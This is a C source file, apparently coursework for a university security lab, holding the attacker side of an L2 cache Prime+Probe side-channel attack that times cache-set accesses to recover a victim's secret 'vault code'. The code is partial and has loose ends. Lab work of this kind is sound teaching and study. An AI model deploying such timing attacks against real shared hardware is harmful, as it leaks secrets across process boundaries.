/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 *
 *  thief.c is the attacker implementation. You need to add the code for 
 *  prime_probe_l2_set_new()
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include "cache.h"
#include "linked_list.h"

void printBinary(uint64_t num) {
  for (int i = 63; i >= 0; i--) {
    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
    if (i % 8 == 0) {
      putchar(' ');
    }
  }
  putchar('\n');
}

// you will need to generate an eviction linked list structure with next,
// previous pointers and time measurements
// then you can use the shuffle function to randomize the access pattern 
// and avoid prefetchers being activated
// then traverse the list for prime and probe
// you might want to consider adding some delay between steps
// finally you need to traverse the list one more time to retrieve 
// the time measurements
bool prime_probe_l2_set(int set, char *buf, cache_line* curr) {
  bool found = false;
  uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
  uint32_t timing;
  uint64_t lineAddr;
  uint64_t start=0, end =0;
//  uint64_t weighted_avg;
//  for (int i = 0; i < L2_WAYS; i++) {
    // Set the first byte of each line to 1
//    lineAddr = addr + i * L2_LINE_SIZE;
  serialize();
  start = rdtsc();
  measure_line_access_time(addr);
  mfence();
  end = rdtscp();
  serialize();
  timing = end - start;
    if (set == 992 || set == 209 || set == 63) {
      printf("Time: %ld\n", (end-start));
      printf("Address = %ld, set %d  timing = %d \n", lineAddr, set, timing);
    }

    if(timing > 30){
      found = true;
    }
//  }

  return found;
}

bool prime_probe_l2_line(int line, cache_line* curr) {
  serialize();
  curr->start = rdtsc();
  measure_line_access_time(curr->lineAddr);
  mfence();
  curr->end = rdtscp();
  serialize();
  return false;
}

int main(int argc, char const *argv[]) {
  void *buf = NULL;
  int buf_size = 1 << 21;
  if (posix_memalign(&buf, 1 << 21, buf_size)) { // Allocates 2MB aligned memory, begins at 0x200000
    perror("posix_memalign");
  }
  madvise(buf, buf_size, MADV_HUGEPAGE);
  *((char *)buf) = 5;

  int evict_count[L2_SETS];
  for (int i = 0; i < L2_SETS; i++) {
    evict_count[i] = 0;
  }

  cache_line* cache_head = setup_cache(L2_WAYS, L2_SETS, buf);
  cache_line* curr = cache_head;
  prime_cache(curr);

  int num_reps = 10;
  for (int rep = 0; rep < num_reps; rep++) {
    for (int i=0 ; i< L2_SETS ; i++) {
      if (prime_probe_l2_set(i, buf, curr)) {
        evict_count[i]++;
      }
    }
  }

  free_cache(cache_head);

  int max_val = 2;
  int max_set = -1;
  for (int set = 0; set < L2_SETS; set++) {
    uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
//      if(evict_count[set] > 995) {
    printf(" set addr = %ld, set number = %d , evict_count = %d\n",addr, set, evict_count[set]);
//      }

    if (evict_count[set] > max_val) {
      max_val = evict_count[set];
      max_set = set;
      uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
      printBinary(addr);
      printf(" set addr = %ld, set number = %d , evict_count = %d\n",addr, set, evict_count[set]);
    }
  }
  printf("Vault code: %d (%d)\n", max_set, max_val);
}
